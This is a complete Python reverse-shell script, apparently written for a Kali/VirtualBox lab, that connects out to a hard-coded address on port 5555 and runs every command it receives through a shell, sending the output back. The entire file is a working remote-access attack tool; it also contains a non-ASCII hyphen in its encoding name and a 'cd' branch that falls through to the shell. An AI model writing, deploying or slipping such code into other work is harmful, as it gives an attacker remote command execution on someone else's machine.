#!/usr/bin/env python3
import socket
import subprocess, os

# reverse shell initiation
kali_ip = "10.0.2.15" #This IP can be different on your virtual box
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((kali_ip, 5555))  
# show on success connection
s.send(b"Connected! Please type your input:\n")  

# Receive data from host
msg = ""
# Continous commands until exit or terminate
while True:
	received_data = s.recv(1024).decode("utf‐8").strip('\n')
	if not received_data:
		break
	elif received_data.lower() == "exit" or received_data.lower() == "quit":
		break
	elif "cd" in received_data:
		path = received_data.split()
		try:
			os.chdir(path[1]) # change directory
		except FileNotFoundError as e:
			s.send(str(e).encode())
			s.send(b"\n")
		except IndexError as e:
			s.send(b"Please specify path\n")
		else:
			wd = os.getcwd() # get current directory
			s.send(wd.encode())
			s.send(b"\n")
	p = subprocess.Popen(received_data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	output, err = p.communicate()
	if not err:
		s.send(output + b"\n")
	else:
		s.send(err + b"\n")
		
s.send(b"--Closed--")
s.close()
